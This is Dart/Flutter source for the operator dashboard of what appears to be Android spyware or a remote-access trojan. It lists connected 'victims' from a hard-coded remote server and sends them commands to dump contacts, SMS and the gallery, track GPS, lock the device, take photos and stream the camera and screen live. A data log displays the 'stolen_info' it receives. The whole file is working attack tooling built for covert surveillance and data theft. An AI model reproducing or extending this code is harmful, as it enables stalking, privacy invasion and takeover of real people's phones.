import 'dart:async';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

class ZDXDashboard extends StatefulWidget {
  const ZDXDashboard({super.key});

  @override
  _ZDXDashboardState createState() => _ZDXDashboardState();
}

class _ZDXDashboardState extends State<ZDXDashboard> with SingleTickerProviderStateMixin {
  List victims = [];
  bool isLoading = false;
  bool isRefreshing = false;
  final String serverUrl = "http://arss.miuntech.my.id:2005";
  
  late AnimationController _glowController;
  late Animation<double> _glowAnimation;
  int _selectedIndex = 0;

  @override
  void initState() {
    super.initState();
    fetchVictims();
    Timer.periodic(const Duration(seconds: 5), (t) => fetchVictims());
    
    _glowController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    )..repeat(reverse: true);
    
    _glowAnimation = Tween<double>(begin: 0.2, end: 0.6).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOut),
    );
  }

  @override
  void dispose() {
    _glowController.dispose();
    super.dispose();
  }

  Future<void> fetchVictims() async {
    if (!mounted) return;
    setState(() => isRefreshing = true);
    try {
      final res = await http.get(Uri.parse("$serverUrl/list")).timeout(const Duration(seconds: 10));
      if (res.statusCode == 200) {
        setState(() => victims = json.decode(res.body));
      }
    } catch (e) {
      debugPrint("Fetch Error: $e");
    } finally {
      if (mounted) setState(() => isRefreshing = false);
    }
  }

  Future<void> sendCommand(String victimId, String command) async {
    try {
      final res = await http.post(
        Uri.parse("$serverUrl/send_command"),
        body: jsonEncode({"id": victimId, "cmd": command}),
        headers: {"Content-Type": "application/json"},
      );
      
      if (res.statusCode == 200) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            backgroundColor: Colors.red.shade900,
            behavior: SnackBarBehavior.floating,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
            content: Row(
              children: [
                Container(
                  width: 3,
                  height: 20,
                  color: Colors.red.shade400,
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Text(
                    "COMMAND SENT: $command",
                    style: const TextStyle(
                      fontFamily: 'SF Mono',
                      fontSize: 11,
                      fontWeight: FontWeight.w500,
                      letterSpacing: 0.5,
                    ),
                  ),
                ),
              ],
            ),
            duration: const Duration(seconds: 2),
          ),
        );
      }
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          backgroundColor: Colors.red.shade900,
          behavior: SnackBarBehavior.floating,
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          content: const Row(
            children: [
              Icon(Icons.error_outline, color: Colors.white, size: 18),
              SizedBox(width: 12),
              Text("Connection failed", style: TextStyle(fontSize: 12)),
            ],
          ),
        ),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: _buildAppBar(),
      body: Column(
        children: [
          _buildStatsBar(),
          Expanded(
            child: isLoading 
              ? _buildLoadingState()
              : victims.isEmpty 
                ? _buildEmptyState()
                : _buildVictimList(),
          ),
        ],
      ),
    );
  }

  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      title: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            width: 6,
            height: 6,
            decoration: BoxDecoration(
              color: Colors.red.shade500,
              shape: BoxShape.circle,
              boxShadow: [
                BoxShadow(
                  color: Colors.red.shade500,
                  blurRadius: 8,
                ),
              ],
            ),
          ),
          const SizedBox(width: 10),
          const Text(
            "EXPENSIVE",
            style: TextStyle(
              color: Colors.white,
              fontWeight: FontWeight.w600,
              letterSpacing: 2.5,
              fontSize: 12,
              fontFamily: 'SF Mono',
            ),
          ),
        ],
      ),
      backgroundColor: Colors.transparent,
      elevation: 0,
      centerTitle: true,
      leading: IconButton(
        icon: const Icon(Icons.arrow_back_ios_new_rounded, color: Colors.white, size: 18),
        onPressed: () => Navigator.pop(context),
      ),
      actions: [
        AnimatedBuilder(
          animation: _glowAnimation,
          builder: (context, child) {
            return Container(
              margin: const EdgeInsets.only(right: 12),
              child: IconButton(
                icon: Icon(
                  Icons.sync_rounded,
                  color: Colors.white.withOpacity(0.7 + _glowAnimation.value * 0.3),
                  size: 20,
                ),
                onPressed: isRefreshing ? null : fetchVictims,
              ),
            );
          },
        ),
      ],
    );
  }

  Widget _buildStatsBar() {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      decoration: BoxDecoration(
        color: const Color(0xFF0A0A0A),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.red.shade900.withOpacity(0.3), width: 0.5),
      ),
      child: Row(
        children: [
          _buildStatItem(Icons.devices_rounded, "${victims.length}", "TARGETS"),
          Container(
            width: 1,
            height: 30,
            color: Colors.white.withOpacity(0.1),
            margin: const EdgeInsets.symmetric(horizontal: 16),
          ),
          _buildStatItem(Icons.signal_cellular_alt_rounded, "ONLINE", "STATUS"),
          Container(
            width: 1,
            height: 30,
            color: Colors.white.withOpacity(0.1),
            margin: const EdgeInsets.symmetric(horizontal: 16),
          ),
          _buildStatItem(Icons.security_rounded, "ACTIVE", "MODE"),
        ],
      ),
    );
  }

  Widget _buildStatItem(IconData icon, String value, String label) {
    return Expanded(
      child: Column(
        children: [
          Icon(icon, color: Colors.red.shade400, size: 16),
          const SizedBox(height: 6),
          Text(
            value,
            style: const TextStyle(
              color: Colors.white,
              fontSize: 13,
              fontWeight: FontWeight.w600,
              fontFamily: 'SF Mono',
            ),
          ),
          Text(
            label,
            style: TextStyle(
              color: Colors.white.withOpacity(0.4),
              fontSize: 9,
              fontWeight: FontWeight.w500,
              letterSpacing: 0.5,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildLoadingState() {
    return const Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          SizedBox(
            width: 30,
            height: 30,
            child: CircularProgressIndicator(
              color: Color(0xFFDC2626),
              strokeWidth: 2,
            ),
          ),
          SizedBox(height: 16),
          Text(
            "SCANNING NETWORK...",
            style: TextStyle(
              color: Color(0xFFDC2626),
              fontSize: 10,
              letterSpacing: 2,
              fontWeight: FontWeight.w500,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildEmptyState() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Container(
            width: 80,
            height: 80,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              border: Border.all(color: Colors.white.withOpacity(0.1), width: 1),
            ),
            child: Icon(Icons.radar, size: 35, color: Colors.white.withOpacity(0.2)),
          ),
          const SizedBox(height: 20),
          Text(
            "NO TARGETS DETECTED",
            style: TextStyle(
              color: Colors.white.withOpacity(0.3),
              fontSize: 11,
              letterSpacing: 2,
              fontWeight: FontWeight.w500,
            ),
          ),
          const SizedBox(height: 8),
          Text(
            "Waiting for devices to connect...",
            style: TextStyle(
              color: Colors.white.withOpacity(0.15),
              fontSize: 10,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildVictimList() {
    return ListView.builder(
      physics: const BouncingScrollPhysics(),
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
      itemCount: victims.length,
      itemBuilder: (context, i) => _buildVictimCard(i),
    );
  }

  Widget _buildVictimCard(int i) {
    final victim = victims[i];
    final isOnline = victim['status'] == 'Online';
    
    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      decoration: BoxDecoration(
        color: const Color(0xFF0A0A0A),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(
          color: isOnline ? Colors.red.shade900.withOpacity(0.3) : Colors.white.withOpacity(0.05),
          width: 0.5,
        ),
      ),
      child: Theme(
        data: Theme.of(context).copyWith(dividerColor: Colors.transparent),
        child: ExpansionTile(
          iconColor: Colors.red.shade400,
          collapsedIconColor: Colors.white.withOpacity(0.3),
          tilePadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
          leading: Container(
            width: 40,
            height: 40,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              gradient: LinearGradient(
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
                colors: [
                  Colors.red.shade800.withOpacity(0.3),
                  Colors.red.shade900.withOpacity(0.1),
                ],
              ),
            ),
            child: Icon(
              Icons.smartphone_rounded,
              color: isOnline ? Colors.green.shade400 : Colors.white.withOpacity(0.3),
              size: 20,
            ),
          ),
          title: Text(
            victim['model'] ?? 'Unknown Device',
            style: const TextStyle(
              color: Colors.white,
              fontSize: 14,
              fontWeight: FontWeight.w600,
            ),
          ),
          subtitle: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const SizedBox(height: 4),
              Row(
                children: [
                  Container(
                    width: 6,
                    height: 6,
                    decoration: BoxDecoration(
                      color: isOnline ? Colors.green.shade400 : Colors.grey.shade600,
                      shape: BoxShape.circle,
                    ),
                  ),
                  const SizedBox(width: 6),
                  Text(
                    victim['id'] ?? 'N/A',
                    style: TextStyle(
                      color: isOnline ? Colors.green.shade400 : Colors.white.withOpacity(0.3),
                      fontSize: 9,
                      fontFamily: 'SF Mono',
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 4),
              Text(
                "Last seen: ${victim['seen'] ?? 'N/A'}",
                style: TextStyle(
                  color: Colors.white.withOpacity(0.25),
                  fontSize: 9,
                ),
              ),
            ],
          ),
          trailing: Container(
            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
            decoration: BoxDecoration(
              color: isOnline ? Colors.green.shade900.withOpacity(0.2) : Colors.white.withOpacity(0.05),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(
                color: isOnline ? Colors.green.shade700.withOpacity(0.3) : Colors.transparent,
                width: 0.5,
              ),
            ),
            child: Text(
              isOnline ? "ACTIVE" : "OFFLINE",
              style: TextStyle(
                color: isOnline ? Colors.green.shade400 : Colors.white.withOpacity(0.2),
                fontSize: 8,
                fontWeight: FontWeight.w600,
                letterSpacing: 1,
              ),
            ),
          ),
          children: [
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 8, 16, 20),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  // Command categories
                  _buildCommandCategory("ESSENTIAL", [
                    _buildCommandButton("CONTACTS", () => sendCommand(victim['id'], "dump_contacts")),
                    _buildCommandButton("GPS", () => sendCommand(victim['id'], "track_gps")),
                    _buildCommandButton("SMS", () => sendCommand(victim['id'], "get_sms")),
                    _buildCommandButton("GALLERY", () => sendCommand(victim['id'], "get_gallery")),
                  ]),
                  
                  const SizedBox(height: 16),
                  
                  _buildCommandCategory("CONTROL", [
                    _buildCommandButton("LOCK", () => sendCommand(victim['id'], "lock_device")),
                    _buildCommandButton("UNLOCK", () => sendCommand(victim['id'], "unlock_device")),
                    _buildCommandButton("LOCK LIVE", () => sendCommand(victim['id'], "lock_live")),
                  ]),
                  
                  const SizedBox(height: 16),
                  
                  _buildCommandCategory("MEDIA", [
                    _buildCommandButton("CAMERA", () => sendCommand(victim['id'], "take_photo")),
                    _buildCommandButton("SCREEN", () => sendCommand(victim['id'], "get_screen")),
                    _buildCommandButton("LIVE CAM", () => sendCommand(victim['id'], "live_camera_start")),
                    _buildCommandButton("LIVE SCRN", () => sendCommand(victim['id'], "live_screen_start")),
                  ]),
                  
                  const SizedBox(height: 16),
                  
                  _buildCommandCategory("SYSTEM", [
                    _buildCommandButton("STROBE ON", () => sendCommand(victim['id'], "flash_strobe")),
                    _buildCommandButton("STROBE OFF", () => sendCommand(victim['id'], "stop_strobe")),
                    _buildCommandButton("VIBRATE", () => sendCommand(victim['id'], "vibrate_loop")),
                    _buildCommandButton("WALLPAPER", () => sendCommand(victim['id'], "set_wallpaper")),
                    _buildCommandButton("REBOOT", () => sendCommand(victim['id'], "reboot_device")),
                  ]),
                  
                  const SizedBox(height: 20),
                  
                  // Data log section
                  _buildDataLog(victim['stolen_info'] ?? 'No data retrieved yet.'),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildCommandCategory(String title, List<Widget> buttons) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Padding(
          padding: const EdgeInsets.only(bottom: 8, left: 4),
          child: Row(
            children: [
              Container(
                width: 3,
                height: 12,
                color: Colors.red.shade600,
              ),
              const SizedBox(width: 8),
              Text(
                title,
                style: TextStyle(
                  color: Colors.white.withOpacity(0.5),
                  fontSize: 10,
                  fontWeight: FontWeight.w600,
                  letterSpacing: 1.5,
                ),
              ),
            ],
          ),
        ),
        Wrap(
          spacing: 8,
          runSpacing: 8,
          alignment: WrapAlignment.start,
          children: buttons,
        ),
      ],
    );
  }

  Widget _buildCommandButton(String label, VoidCallback onPressed) {
    return SizedBox(
      height: 32,
      child: ElevatedButton(
        onPressed: onPressed,
        style: ElevatedButton.styleFrom(
          backgroundColor: Colors.transparent,
          foregroundColor: Colors.red.shade400,
          elevation: 0,
          padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 0),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: Colors.red.shade800.withOpacity(0.5), width: 0.8),
          ),
        ),
        child: Text(
          label,
          style: const TextStyle(
            fontSize: 10,
            fontWeight: FontWeight.w500,
            letterSpacing: 0.5,
          ),
        ),
      ),
    );
  }

  Widget _buildDataLog(String log) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Padding(
          padding: const EdgeInsets.only(bottom: 8, left: 4),
          child: Row(
            children: [
              Container(
                width: 3,
                height: 12,
                color: Colors.red.shade600,
              ),
              const SizedBox(width: 8),
              Text(
                "DATA LOG",
                style: TextStyle(
                  color: Colors.white.withOpacity(0.5),
                  fontSize: 10,
                  fontWeight: FontWeight.w600,
                  letterSpacing: 1.5,
                ),
              ),
            ],
          ),
        ),
        Container(
          width: double.infinity,
          constraints: const BoxConstraints(minHeight: 120),
          padding: const EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: Colors.black,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: Colors.white.withOpacity(0.05), width: 0.5),
          ),
          child: SingleChildScrollView(
            child: Text(
              log,
              style: TextStyle(
                color: Colors.green.shade400,
                fontSize: 9,
                fontFamily: 'SF Mono',
                height: 1.5,
              ),
            ),
          ),
        ),
      ],
    );
  }
}